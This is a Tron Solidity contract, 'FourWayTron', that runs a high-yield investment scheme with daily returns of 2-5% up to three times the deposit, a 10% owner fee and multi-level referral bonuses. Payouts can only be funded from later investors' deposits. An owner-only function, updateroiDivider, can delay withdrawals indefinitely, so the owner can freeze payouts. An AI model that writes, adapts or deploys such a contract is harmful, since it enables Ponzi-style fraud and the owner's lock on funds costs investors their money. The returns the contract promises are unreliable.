//SourceUnit: fourwaytron.sol

    pragma solidity 0.5.10;
    
    contract FourWayTron {
    
        struct Tarif {
            uint256 life_days;
            uint256 percent;
            uint256 min_inv;
        }
    
        struct Deposit {
            uint8 tarif;
            uint256 amount;
            uint256 totalWithdraw;
            uint256 time;
            uint256 withdrawTime;
        }
    
        struct Player {
            address upline;
            uint256 dividends;
            uint256 direct_bonus;
            uint256 match_bonus;
            uint256 last_payout;
            uint256 total_invested;
            uint256 total_withdrawn;
            uint256 total_match_bonus;
            Deposit[] deposits;
            mapping(uint8 => uint256) structure;
        }
    
        address payable owner;
        uint256  public total_player;
    
        uint256 public invested;
        uint256 public withdrawn;
        uint256 private roiDivider = 1 days;
        uint256 public direct_bonus;
        uint256 public match_bonus;
    
        uint8[] public ref_bonuses; // 1 => 10%
    
        Tarif[] public tarifs;
        mapping(address => Player) public players;
        mapping(address => bool) public is_exits;
    
        event Upline(address indexed addr, address indexed upline, uint256 bonus);
        event OwnerFee(address indexed addr, uint8 tarif, uint256 depositamount);
        event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
        event MatchPayout(address indexed addr, address indexed from, uint256 amount);
        event Withdraw(address indexed addr, uint256 amount);
        event LimitReached(address indexed addr, uint256 amount);
    
        constructor() public {
            owner = msg.sender;
            tarifs.push(Tarif(150, 300,100 trx)); //ROI 2%
            tarifs.push(Tarif(100, 300,200 trx)); //ROI 3%
            tarifs.push(Tarif(75, 300,300 trx)); //ROI 4%
            tarifs.push(Tarif(60, 300,500 trx)); //ROI 5%            
            
            ref_bonuses.push(250);
            ref_bonuses.push(200);
            ref_bonuses.push(150);
            ref_bonuses.push(10); 
            ref_bonuses.push(10); 
            ref_bonuses.push(10); 
            ref_bonuses.push(10);          
        }
    
        function _payout(address _addr) private {
            uint256 payout = this.payoutOf(_addr);
            
            if(payout > 0) {
                _updateTotalPayout(_addr);
                players[_addr].last_payout = uint256(block.timestamp);
                players[_addr].dividends += payout;
            }
        }
    
        function _updateTotalPayout(address _addr) private{
            Player storage player = players[_addr];
    
            for(uint256 i = 0; i < player.deposits.length; i++) {
                Deposit storage dep = player.deposits[i];
                Tarif storage tarif = tarifs[dep.tarif];
    
                uint256 time_end = dep.time + tarif.life_days * 86400;
                uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
                uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);
    
                if(from < to) {
                    player.deposits[i].totalWithdraw += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
                }
            }
        }
        function maxpayout(address _addr) public view returns(uint256 maxpayout){
            Player storage player = players[_addr];  
            uint256 max = 0 trx;  
            for(uint256 i = 0; i < player.deposits.length; i++) {
                Deposit storage dep = player.deposits[i];
                Tarif storage tarif = tarifs[dep.tarif];
                max += dep.amount * 3;
            }
            return max;
        }
    
        function _refPayout(address _addr, uint256 _amount) private {
            address up = players[_addr].upline;
    
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                if(up == address(0)) break;
    
                uint256 bonus = _amount * ref_bonuses[i] / 1000;
    
                players[up].match_bonus += bonus;
                players[up].total_match_bonus += bonus;
    
                match_bonus += bonus;
    
                emit MatchPayout(up, _addr, bonus);
    
                up = players[up].upline;
            }
        }
    
        function _setUpline(address _addr, address _upline, uint256 _amount) private {
            if(players[_addr].upline == address(0)) {//first time entry
                if(players[_upline].deposits.length == 0 && _addr == _upline) {//no deposite from my upline
                    _upline = owner;
                }                
                players[_upline].direct_bonus += _amount / 10;
                direct_bonus += _amount / 10;
                players[_addr].upline = _upline;
    
                emit Upline(_addr, _upline, _amount / 10);
    
                for(uint8 i = 0; i < ref_bonuses.length; i++) {
                    players[_upline].structure[i]++;                    
                    _upline = players[_upline].upline;    
                    if(_upline == address(0)) break;
                }
            }else {
                players[players[_addr].upline].direct_bonus += _amount / 10;
                direct_bonus += _amount / 10;
            }
        }
    
        function deposit(uint8 _tarif, address _upline) external payable {
            require(tarifs[_tarif].life_days > 0, "Tarif not found"); // ??
            require(msg.value >= tarifs[_tarif].min_inv, "Less Then the min investment");
            Player storage player = players[msg.sender];
    
            require(player.deposits.length < 100, "Max 100 deposits per address");
            
            if(!is_exits[msg.sender])
            {
                  total_player++;
            }
            is_exits[msg.sender] = true;
    
            _setUpline(msg.sender, _upline, msg.value);
    
            player.deposits.push(Deposit({
                tarif: _tarif,
                amount: msg.value,
                totalWithdraw: 0,
                time: uint256(block.timestamp),
                withdrawTime: uint256(block.timestamp + 1 days)
            }));    
            player.total_invested += msg.value;
            invested += msg.value;
            sendOwnerFee(msg.sender,_tarif,msg.value * 10 / 100);
            emit NewDeposit(msg.sender, msg.value, _tarif);
        }
        
        function withdraw() external {          
            Player storage player = players[msg.sender];
            uint256 max_payout = maxpayout(msg.sender);
            require(player.total_withdrawn < max_payout, "Full payouts");
            _payout(msg.sender);
    
            require(player.dividends > 0 || player.match_bonus > 0 || player.direct_bonus > 0, "Zero amount");
            uint256 readyToWithdraw = 0;
            uint256 to_payout = player.dividends;
            if(to_payout > 0) {
                if(player.total_withdrawn + to_payout > max_payout) {
                    to_payout = max_payout - player.total_withdrawn;
                }
                player.dividends = 0;
                player.total_withdrawn += to_payout;
                withdrawn += to_payout;
                readyToWithdraw += to_payout;
                _refPayout(msg.sender, to_payout);
            }
            if(player.total_withdrawn < max_payout && player.direct_bonus > 0) {
                uint256 direct_bonus = player.direct_bonus;
                if(player.total_withdrawn + direct_bonus > max_payout) {
                    direct_bonus = max_payout - player.total_withdrawn;
                }
                player.direct_bonus -= direct_bonus;
                player.total_withdrawn += direct_bonus;
                withdrawn += direct_bonus;
                readyToWithdraw += direct_bonus;
            }
            if(player.total_withdrawn < max_payout && player.match_bonus > 0) {
                uint256 match_bonus = player.match_bonus;
                if(player.total_withdrawn + match_bonus > max_payout) {
                    match_bonus = max_payout - player.total_withdrawn;
                }
                player.match_bonus -= match_bonus;
                player.total_withdrawn += match_bonus;
                withdrawn += match_bonus;
                readyToWithdraw += match_bonus;
            }
            msg.sender.transfer(readyToWithdraw);
            emit Withdraw(msg.sender, readyToWithdraw);
            if(player.total_withdrawn >= max_payout) {
                emit LimitReached(msg.sender, player.total_withdrawn);
            }
        }
        function sendOwnerFee(address from,uint8 tarif,uint256 feeAmount) public payable{
            require(msg.value >= 100 trx,"Less then the minimum deposit");
            owner.transfer(feeAmount);
            emit OwnerFee(from,tarif,msg.value);
        }
    
        function payoutOf(address _addr) view external returns(uint256 value) {
            Player storage player = players[_addr];
    
            for(uint256 i = 0; i < player.deposits.length; i++) {
                Deposit storage dep = player.deposits[i];
                Tarif storage tarif = tarifs[dep.tarif];
    
                uint256 time_end = dep.time + tarif.life_days * 86400;
                uint256 fromtime = player.last_payout > dep.time ? player.last_payout : dep.time;
                uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);
                uint256 withdrawtime = dep.time + roiDivider;
                if(fromtime < to && withdrawtime <= uint256(block.timestamp)) {
                    value += dep.amount * (to - fromtime) * tarif.percent / tarif.life_days / 8640000;
                }
            }    
            return value;
        }
        
        function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 withdrawable_bonus, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[7] memory structure) {
            Player storage player = players[_addr];
            uint256 payout = this.payoutOf(_addr);    
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                structure[i] = player.structure[i];
            }    
            return (
                payout + player.dividends + player.direct_bonus + player.match_bonus,
                player.direct_bonus + player.match_bonus,
                player.total_invested,
                player.total_withdrawn,
                player.total_match_bonus,
                structure
            );
        }
    
        function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _direct_bonus, uint256 _match_bonus,uint256 balance) {
            balance = address(this).balance;
            return (invested, withdrawn, direct_bonus, match_bonus,balance);
        }
    
        function investmentsInfo(address _addr) view external returns(uint8[] memory ids, uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
            Player storage player = players[_addr];
    
            uint8[] memory _ids = new uint8[](player.deposits.length);
            uint256[] memory _endTimes = new uint256[](player.deposits.length);
            uint256[] memory _amounts = new uint256[](player.deposits.length);
            uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);
    
            for(uint256 i = 0; i < player.deposits.length; i++) {
              Deposit storage dep = player.deposits[i];
              Tarif storage tarif = tarifs[dep.tarif];
    
              _ids[i] = dep.tarif;
              _amounts[i] = dep.amount;
              _totalWithdraws[i] = dep.totalWithdraw;
              _endTimes[i] = dep.time + tarif.life_days * 86400;
            }
    
            return (
              _ids,
              _endTimes,
              _amounts,
              _totalWithdraws
            );
        }
    
        function dailyDividents(address _addr) view external returns(uint256[] memory withdrawable) {
            Player storage player = players[_addr];
            uint256[] memory values = new uint256[](player.deposits.length);
            for(uint256 i = 0; i < player.deposits.length; i++) {
                Deposit storage dep = player.deposits[i];
                Tarif storage tarif = tarifs[dep.tarif];
    
                uint256 time_end = dep.time + tarif.life_days * 86400;
                uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
                uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);
    
                if(from < to) {
                    values[i] = dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
                }
            }
    
            return values;
        }
        
        function updateroiDivider(uint256 numofdays) public  {
            require(msg.sender==owner);
            roiDivider = numofdays * 1 days;
        }            
        
    }